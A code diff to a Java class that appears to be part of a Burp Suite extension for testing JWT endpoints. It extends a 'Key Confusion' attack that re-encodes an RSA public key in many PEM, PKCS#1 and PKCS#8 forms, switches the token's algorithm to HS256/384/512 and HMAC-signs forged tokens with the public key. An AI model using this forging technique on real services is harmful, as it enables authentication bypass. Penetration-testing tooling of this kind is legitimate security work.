@@ -49,7 +49,9 @@ public class KeyConfusionInfo implements IAttackInfo {
     // Full name of the attack
     private static final String name = "Key Confusion";
     // Attack description
-    private static final String description = "Description";
+    private static final String description = "<html>The <em>Key Confusion</em> attack exploits a vulnerability where a " +
+            "<em>public key</em> is mistakenly used as <em>mac secret</em>.<br/>" +
+            "Such a vulnerability occurs when the endpoint expects a RSA signed token and does not correctly check the actually used or allowed algorithm.</html>";
     // List of types this attack is suitable for
     private static final List<String> suitableTypes = Arrays.asList("jwt", "jws");
     // Array of algorithms to test
@@ -72,6 +74,9 @@ public class KeyConfusionInfo implements IAttackInfo {
         this.requestResponse = requestResponse;
         this.parameter = parameter;
 
+        this.publicKeyVariations.clear();
+        this.requests.clear();
+
         String publicKeyValue = publicKey.getText();
 
         // Throw error if public key value is empty
@@ -90,14 +95,31 @@ public class KeyConfusionInfo implements IAttackInfo {
                 try {
                     Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);
 
-
                     loggerInstance.log(getClass(), "" + publickKeyValueJson, Logger.LogLevel.DEBUG);
 
-                    List<PublicKey> publicKeys = new Jwk().getRsaPublicKeys(publickKeyValueJson);
+                    List<PublicKey> publicKeys = Jwk.getRsaPublicKeys(publickKeyValueJson);
 
                     for (PublicKey publicKey : publicKeys) {
-                        loggerInstance.log(getClass(), "Encoded PubKey" + Base64.encodeBase64String(publicKey.getEncoded()), Logger.LogLevel.DEBUG);
+                        loggerInstance.log(getClass(), "Encoded PubKey: " + Base64.encodeBase64String(publicKey.getEncoded()) + "\nFormat: " + publicKey.getFormat(), Logger.LogLevel.DEBUG);
+
+                        // PKCS#8 / X.509
                         publicKeyVariations.add(Base64.encodeBase64String(publicKey.getEncoded()));
+
+                        // PKCS#1, easy but hacky transformation
+                        publicKeyVariations.add(Base64.encodeBase64String(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)));
+
+                        // With line feeds
+                        Base64 base64Pem = new Base64(64, "\n".getBytes("UTF-8"));
+                        publicKeyVariations.add(base64Pem.encodeToString(publicKey.getEncoded()));
+                        publicKeyVariations.add(base64Pem.encodeToString(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)));
+
+                        // With line feeds and header/footer
+                        publicKeyVariations.add("-----BEGIN PUBLIC KEY-----\n" + base64Pem.encodeToString(publicKey.getEncoded()) + "-----END PUBLIC KEY-----");
+                        publicKeyVariations.add("-----BEGIN RSA PUBLIC KEY-----\n" + base64Pem.encodeToString(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)) + "-----END RSA PUBLIC KEY-----");
+
+                        // With line feeds and header/footer and additional line feed at end
+                        publicKeyVariations.add("-----BEGIN PUBLIC KEY-----\n" +base64Pem.encodeToString(publicKey.getEncoded()) + "-----END PUBLIC KEY-----\n");
+                        publicKeyVariations.add("-----BEGIN RSA PUBLIC KEY-----\n" + base64Pem.encodeToString(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)) + "-----END RSA PUBLIC KEY-----\n");
 
                     }
 
@@ -110,55 +132,99 @@ public class KeyConfusionInfo implements IAttackInfo {
             default:
                 loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);
 
+                // Simple check if String has valid format
+                if(!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MII")) {
+                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
+                }
+
+                // No modification
                 publicKeyVariations.add(publicKeyValue);
 
+                // Without header/footer
                 String publickKeyValueNoHeaderFooter = publicKeyValue.replace("-----BEGIN PUBLIC KEY-----\n", "").replace("-----END PUBLIC KEY-----", "").replace("-----BEGIN RSA PUBLIC KEY-----\n", "").replace("-----END RSA PUBLIC KEY-----", "");
                 publicKeyVariations.add(publickKeyValueNoHeaderFooter);
 
+                // Without line feeds/cariage returns
                 String publickKeyValueNoLinebreaks = publicKeyValue.replaceAll("\\r\\n|\\r|\\n", "");
                 publicKeyVariations.add(publickKeyValueNoLinebreaks);
 
+                // Without header/footer and line feeds/cariage returns
                 String publickKeyValueNoHeaderFooterNoLinebreaks = publickKeyValueNoHeaderFooter.replaceAll("\\r\\n|\\r|\\n", "");
                 publicKeyVariations.add(publickKeyValueNoHeaderFooterNoLinebreaks);
 
+
+                // Trimmed
+                publicKeyVariations.add(publicKeyValue.trim());
+
+                // Without header/footer and trimmed
+                publicKeyVariations.add(publickKeyValueNoHeaderFooter.trim());
+
+                // Without line feeds/cariage returns and trimmed
+                publicKeyVariations.add(publickKeyValueNoLinebreaks.trim());
+
+                // Without header/footer and line feeds/cariage returns and trimmed
+                publicKeyVariations.add(publickKeyValueNoHeaderFooterNoLinebreaks.trim());
+
+
+                // Trimmed with line feed at end
+                publicKeyVariations.add(publicKeyValue.trim() + "\n");
+
+                // Without header/footer and trimmed with line feed at end
+                publicKeyVariations.add(publickKeyValueNoHeaderFooter.trim() + "\n");
+
+                // Without line feeds/cariage returns and trimmed with line feed at end
+                publicKeyVariations.add(publickKeyValueNoLinebreaks.trim() + "\n");
+
+                // Without header/footer and line feeds/cariage returns and trimmed with line feed at end
+                publicKeyVariations.add(publickKeyValueNoHeaderFooterNoLinebreaks.trim() + "\n");
+
                 break;
         }
-
 
         for (String publicKey : publicKeyVariations) {
             for (String algorithm : algorithms) {
                 try {
                     // Change the "alg" header value for each of the algorithms entries
-
                     byte[] request = this.requestResponse.getRequest();
                     String[] components = joseDecoder.getComponents(this.parameter.getValue());
                     String decodedHeader = joseDecoder.getDecoded(components[0]);
                     String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");
                     String encodedHeaderReplacedAlgorithm = joseDecoder.getEncoded(decodedHeaderReplacedAlgorithm);
 
+                    String macAlg;
+                    switch(algorithm) {
+                        case "HS384":
+                            macAlg = "HmacSHA384";
+                            break;
+                        case "HS512":
+                            macAlg = "HmacSHA512";
+                            break;
+                        default:
+                            macAlg = "HmacSHA256";
+                    }
+
                     // Generate signature
-                    // TODO: Different algs
-                    Mac mac = Mac.getInstance("HmacSHA256");
-                    SecretKeySpec secret_key = new SecretKeySpec(helpers.stringToBytes(publicKey), "HmacSHA256");
+                    Mac mac = Mac.getInstance(macAlg);
+                    SecretKeySpec secret_key = new SecretKeySpec(helpers.stringToBytes(publicKey), macAlg);
                     mac.init(secret_key);
-                    loggerInstance.log(getClass(), publicKey, Logger.LogLevel.DEBUG);
                     String newSignature = joseDecoder.getEncoded(mac.doFinal(helpers.stringToBytes(joseDecoder.concatComponents(new String[] {encodedHeaderReplacedAlgorithm, components[1]}))));
 
-
+                    // Build new JWT String and update parameter
                     String[] newComponents = {encodedHeaderReplacedAlgorithm, components[1], newSignature};
                     String newComponentsConcatenated = joseDecoder.concatComponents(newComponents);
 
                     IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getType());
                     request = helpers.updateParameter(request, updatedParameter);
 
-                    requests.put(algorithm + publicKey.length(), request);
-                    this.amountRequests++;
+                    // TODO: Add sth else/more to prevent equal key (HashMap has unique keys)
+                    requests.put("Alg: " + algorithm + " KeyLen: " + publicKey.length(), request);
                 } catch (Exception e) {
                     throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
                 }
             }
         }
 
+        this.amountRequests = requests.size();
         return new KeyConfusion(callbacks, this);
     }
 
@@ -196,6 +262,7 @@ public class KeyConfusionInfo implements IAttackInfo {
         publicKeySelection = new JComboBox<>();
         DefaultComboBoxModel<String> publicKeySelectionListModel= new DefaultComboBoxModel<>();
         publicKey = new JTextArea(10, 35);
+        publicKey.setLineWrap(true);
 
         publicKeySelectionListModel.addElement("PEM (String)");
         publicKeySelectionListModel.addElement("JWK (JSON)");
@@ -214,7 +281,6 @@ public class KeyConfusionInfo implements IAttackInfo {
 
         return true;
     }
-
 
     @Override
     public boolean isSuitable(String type, String algorithm) {
